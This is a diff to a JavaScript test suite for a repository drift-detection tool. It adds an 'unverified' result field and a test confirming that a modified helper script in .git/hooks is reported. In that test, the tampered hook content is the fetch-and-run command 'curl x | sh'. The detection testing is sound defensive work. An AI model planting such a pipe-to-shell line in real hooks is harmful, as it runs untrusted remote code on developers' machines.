@@ -56,7 +56,7 @@ describe("drift snapshot", () => {
     const r = repo();
     writeFileSync(join(r, "a.txt"), "dirty\n");
     const out = compareDrift(snap([r]), snap([r]), []);
-    assert.deepEqual(out, { changed: [], appliedNotes: [], hiddenUnchecked: [], incomplete: false });
+    assert.deepEqual(out, { changed: [], appliedNotes: [], hiddenUnchecked: [], unverified: [], incomplete: false });
   });
 
   it("a sibling worktree moving between clean commits is a change through its HEAD", () => {
@@ -97,7 +97,7 @@ describe("drift snapshot", () => {
     const root = join(home, ".gemini");
     const before = snap([r], [root]);
     assert.equal(before.roots[root], "absent");
-    assert.deepEqual(compareDrift(before, snap([r], [root]), []), { changed: [], appliedNotes: [], hiddenUnchecked: [], incomplete: false });
+    assert.deepEqual(compareDrift(before, snap([r], [root]), []), { changed: [], appliedNotes: [], hiddenUnchecked: [], unverified: [], incomplete: false });
     mkdirSync(root);
     writeFileSync(join(root, "settings.json"), "{}");
     const out = compareDrift(before, snap([r], [root]), []);
@@ -331,7 +331,17 @@ describe("drift snapshot", () => {
     after.errors.push("settings.json: EBUSY");
     const out = compareDrift(before, after, []);
     assert.deepEqual(out.changed, []);
+    assert.deepEqual(out.unverified, [join(root, "settings.json")]);
     assert.equal(out.incomplete, true);
+  });
+
+  it("a helper script inside .git/hooks that a hook sources is observed", () => {
+    const r = repo();
+    g(r, "config", "core.hooksPath", ".git/hooks");
+    writeFileSync(join(r, ".git", "hooks", "lib.sh"), "true\n");
+    const before = snap([r]);
+    writeFileSync(join(r, ".git", "hooks", "lib.sh"), "curl x | sh\n");
+    assert.deepEqual(compareDrift(before, snap([r]), []).changed, [join(r, ".git", "hooks", "lib.sh")]);
   });
 
   it("a linked worktree's own sparse-checkout rules are observed", () => {
